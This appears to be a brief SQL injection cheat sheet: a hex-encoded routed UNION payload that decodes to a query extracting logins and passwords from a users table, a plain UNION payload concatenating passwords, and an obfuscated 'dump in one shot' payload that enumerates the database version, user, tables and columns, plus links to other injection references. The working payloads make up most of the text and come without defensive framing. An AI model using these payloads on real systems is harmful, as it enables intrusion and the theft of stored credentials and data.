' uNion sElect 0x2261646d696e2720556e694f6e2053656c65435420312c2047524f55505f434f4e434154286c6f67696e2c2720272c2070617373776f7264292046524f4d20635f776562736572766575725f34392e75736572732d2d202d22-- -

http://forum.sqliwiki.com/showthread.php?tid=82
https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet
http://thanat0s.trollprod.org/2013/01/sqlite-le-mal-aime-des-sqli/
https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29
https://websec.ca/kb/sql_injection
http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/#Gettinguserdefinedtables
http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html



min' union select 1, GROUP_CONCAT(password, ' ') FROM users--


dios Do in one shot

pid=-42 union select 1,2,3,group_concat('Injected by maxo:::',version(),'<br>','user::',system_user(),'<br>','Database::',database(),'<br>',make_set(6,@:=0x0a,(/*!50000select*/(1) %66rom (/*!50000information_schema.columns*/)where table_schema!='information_schema'and@:=make_set(511,@,0x3c6c693e,/*!50000table_name*/,/*!50000column_name*/)),@)),5,6,7,8,9,10,11


by truncation

https://www.notsosecure.com/sql-column-truncation-vulnerabilities/